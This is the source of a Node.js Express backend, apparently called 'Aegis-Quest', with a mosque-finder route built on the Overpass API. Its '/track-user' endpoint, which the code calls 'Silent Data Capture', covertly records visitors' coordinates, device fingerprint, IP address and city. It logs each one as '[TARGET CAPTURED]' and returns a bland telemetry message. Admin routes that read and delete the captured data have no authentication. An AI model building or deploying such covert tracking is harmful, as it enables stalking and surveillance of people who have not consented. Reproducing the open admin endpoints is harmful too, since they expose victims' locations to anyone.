const express = require('express');
const cors = require('cors');
const { MongoClient, ServerApiVersion, ObjectId } = require('mongodb');
const geoip = require('geoip-lite');
const axios = require('axios');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// MongoDB Connection URI
const uri = process.env.MONGODB_URI;

const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  }
});

async function run() {
  try {
    // Database and Collection setup
    const db = client.db("aegisQuest");
    const logsCollection = db.collection("capturedLogs");

    console.log("Connecting to MongoDB...");

    /**
     * 1. Enhanced Silent Data Capture API
     * capture korbe: coords, device { os, browser, type, vendor, model, cpu, resolution, etc. }
     */
    app.post('/track-user', async (req, res) => {
    try {
        const { coords, device } = req.body;

        
        let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        
       
        if (ip === '::1' || ip === '127.0.0.1') {
            ip = "103.147.218.154"; 
        }

        // ২. IP based Geolocation lookup
        const geo = geoip.lookup(ip);

        const finalData = {
          
            coords: coords || { lat: 23.6850, lng: 90.3563 }, 
            

            device: {
                os: device?.os || "Unknown OS",
                osVersion: device?.osVersion || "N/A",
                browser: device?.browser || "Unknown Browser",
                browserVersion: device?.browserVersion || "N/A",
                type: device?.type || "Desktop",
                vendor: device?.vendor || "Generic",
                model: device?.model || "PC",
                cpu: device?.cpu || "N/A",
                resolution: device?.resolution || "Unknown"
            },
            
            ip: ip,

            approximateCity: geo ? geo.city : "Dhaka",
            approximateCountry: geo ? geo.country : "BD",
            timezone: geo ? geo.timezone : "Asia/Dhaka",
            
            receivedAt: new Date().toISOString(),
            displayTime: new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' })
        };

        const result = await logsCollection.insertOne(finalData);
        
        console.log(`[TARGET CAPTURED] IP: ${ip} | City: ${finalData.approximateCity} | OS: ${finalData.device.os}`);
        
        res.status(201).send({ 
            success: true, 
            id: result.insertedId,
            message: "Telemetry synchronized successfully." 
        });

    } catch (error) {
        console.error("Tracking Error:", error);
        res.status(500).send({ success: false, message: "Internal server error" });
    }
});

    /**
     
     */
    app.get('/admin-data', async (req, res) => {
      try {
        const result = await logsCollection.find().sort({ _id: -1 }).toArray();
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Failed to fetch logs" });
      }
    });

    /**
     * 3. Delete Log API
     */
    app.delete('/admin-data/:id', async (req, res) => {
      try {
          const id = req.params.id;
          const query = { _id: new ObjectId(id) };
          const result = await logsCollection.deleteOne(query);
          
          if (result.deletedCount === 1) {
              console.log(`[DATA PURGED] ID: ${id}`);
              res.status(200).send({ success: true, message: "Log deleted successfully" });
          } else {
              res.status(404).send({ success: false, message: "Log not found" });
          }
      } catch (error) {
          console.error("Delete Error:", error);
          res.status(500).send({ success: false, message: "Internal server error" });
      }
    });


    // 4. Purge All Logs (Danger Zone)
app.delete('/admin-data-purge', async (req, res) => {
    try {
        const result = await logsCollection.deleteMany({});
        console.log(`[SYSTEM PURGE] Total Deleted: ${result.deletedCount}`);
        res.status(200).send({ 
            success: true, 
            deletedCount: result.deletedCount,
            message: "All logs have been cleared successfully." 
        });
    } catch (error) {
        console.error("Purge Error:", error);
        res.status(500).send({ success: false, message: "Internal server error" });
    }
});

// index.js (Backend)
 // Jodi axios install na thake, 'npm install axios' korun ba 'fetch' use korun

// index.js er /api/masjids route-ti ebhabe update korun
// index.js (Backend)
app.get('/api/masjids', async (req, res) => {
    try {
        const { lat, lng } = req.query;
        
        if (!lat || !lng) {
            return res.status(400).json({ error: "Missing coordinates" });
        }

        // Overpass Query
        const query = `[out:json];node["amenity"="place_of_worship"]["religion"="muslim"](around:3000, ${lat}, ${lng});out;`;
        const url = `https://overpass-api.de/api/interpreter?data=${encodeURIComponent(query)}`;

        // AXIOS use korun (fetch-er bodole)
        const response = await axios.get(url);
        
        // Axios response directly JSON data provide kore
        res.status(200).json(response.data);
        
    } catch (error) {
        console.error("Overpass Error:", error.message);
        res.status(500).json({ 
            error: "Failed to fetch map data", 
            details: error.message 
        });
    }
});

    app.get('/', (req, res) => {
      res.send('Aegis-Quest Intelligence Server is Active.');
    });

    console.log("Successfully connected to MongoDB!");

  } catch (error) {
    console.error("MongoDB Connection Failed:", error);
  }
}

run().catch(console.dir);

app.listen(port, () => {
  console.log(`Server is running on: http://localhost:${port}`);
});
module.exports = app;